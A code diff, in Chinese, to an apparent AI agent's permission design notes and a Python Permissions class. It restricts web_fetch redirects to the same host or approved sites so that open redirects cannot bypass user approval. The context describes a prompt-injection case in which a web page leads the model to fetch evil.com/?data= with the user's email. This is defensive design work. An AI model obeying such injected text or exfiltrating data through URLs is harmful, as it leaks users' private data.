@@ -74,7 +74,8 @@ MCP 的工具是别人写的程序，它能做什么我们看不到（它说自�
 读网页（web_fetch，给没有联网工具的模型用，见 fetch/）是同一个道理，只是更简单：它只会 GET 一个网址、不输入不点击，
 所以要问的只有"去一个新的网站"这一件：网址本身就能把东西带出去（被网页里的一句话带偏的模型去读 evil.com/?data=你的邮件），
 卡片上写着完整的网址，你看得到带出去的是什么。允许过的网站记在这次运行自己的 FetchSession 上（fetch/session.py），
-和浏览器的那一份分开；换一段对话从头再问。"只读的命令不用问""改工作目录里的文件不用问"两档都不放开它：它不是读你的电脑，
+和浏览器的那一份分开；换一段对话从头再问。跳转只跟到同一个主机和允许过的网站，跳到别的网站不跟（模型要读得再调用一次，照常问你）：
+不然允许过的网站上的"开放跳转"能把网址带到一个卡片上从没出现过的网站。"只读的命令不用问""改工作目录里的文件不用问"两档都不放开它：它不是读你的电脑，
 是往外发；"全部自动允许"不问。定时任务和聊天通道按它们自己的那一档。这台电脑、局域网里的地址不归这里管：一律不读（见 fetch/guard.py）。
 
 操作整台电脑的规矩为什么是这样（见 desktop/__init__.py）：它碰到的是你的整台电脑，屏幕上的任何文字都可能把模型带偏，
@@ -219,7 +220,7 @@ class Permissions:
     def places(self, cwd: Path | None = None) -> Places:
         """命令在哪个目录里运行（不给是工作目录）、哪些地方不能不问就读（给 commands.classify 用）。"""
         protected = [*self.editor.protected, *([self.commands.path] if self.commands is not None else [])]
-        return Places(cwd or self.editor.workspace, protected=protected, private=self.private)
+        return Places(cwd or self.editor.workspace, protected=protected, private=self.private, workspace=self.editor.workspace)
 
     def _reads_only(self, tool_name: str, tool_input: object, tool: object = None) -> str | None:
         """readonly 那一档：这一步是不是只是看。只读的命令、你自己加的命令、读工作目录之外的文件算；
